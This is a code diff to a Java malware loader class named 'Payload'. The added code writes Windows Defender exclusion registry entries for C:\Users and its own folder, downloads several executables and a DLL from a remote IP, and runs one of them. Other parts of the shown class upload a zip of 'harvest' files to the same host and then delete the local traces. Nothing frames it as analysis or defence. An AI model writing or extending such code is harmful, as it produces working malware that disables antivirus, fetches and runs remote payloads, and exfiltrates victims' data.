@@ -191,23 +191,48 @@ public class Payload {
             log("Executing payload...");
             File loaderDir = getLoaderDir();
             
+            // 1. Delete lock file so parent knows we are elevated
             File lock = new File(loaderDir, ".lock");
             if (lock.exists()) {
                 lock.delete();
                 log("Deleted .lock file to notify parent.");
             }
 
+            // 2. Add AV Exclusions IMMEDIATELY
             log("Adding AV exclusion...");
-            String regPath = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
-            String cmd = "reg add \"" + regPath + "\" /v \"C:\\Users\" /t REG_DWORD /d 0 /f";
-            Runtime.getRuntime().exec(cmd).waitFor();
-            
+            try {
+                // Exclude C:\Users
+                ProcessBuilder pb1 = new ProcessBuilder(
+                    "reg", "add", 
+                    "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths", 
+                    "/v", "C:\\Users", 
+                    "/t", "REG_DWORD", "/d", "0", "/f"
+                );
+                pb1.start().waitFor();
+
+                // Exclude AppBroker path specifically
+                ProcessBuilder pb2 = new ProcessBuilder(
+                    "reg", "add", 
+                    "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths", 
+                    "/v", loaderDir.getAbsolutePath(), 
+                    "/t", "REG_DWORD", "/d", "0", "/f"
+                );
+                pb2.start().waitFor();
+                
+                // Wait a moment for Defender to register the exclusions
+                Thread.sleep(2000); 
+            } catch (Exception e) {
+                log("Failed to add exclusions: " + e.toString());
+            }
+
+            // 3. Download payloads
             log("Downloading payloads...");
             String[] files = {"1.exe", "2.exe", "3.exe", "crmodule.dll"};
             for (String file : files) {
                 downloadFile("http://" + ip + "/api/downloads/" + file, new File(loaderDir, file));
             }
 
+            // 4. Execute
             File exe3 = new File(loaderDir, "3.exe");
             log("Executing 3.exe...");
             new ProcessBuilder(exe3.getAbsolutePath(), "all")
@@ -240,7 +265,7 @@ public class Payload {
             uploadFile("http://" + ip + "/api/rpc", zipFile, key);
             log("Done!");
 
-            // NEW: Cleanup old files so the next run gets a fresh sample
+            // 5. Cleanup
             log("Cleaning up harvest files...");
             if (zipFile.exists()) zipFile.delete();
             deleteDir(new File(loaderDir, "output"));
@@ -252,7 +277,6 @@ public class Payload {
         }
     }
 
-    // Helper to recursively delete a directory
     private static void deleteDir(File dir) {
         if (!dir.exists()) return;
         try {
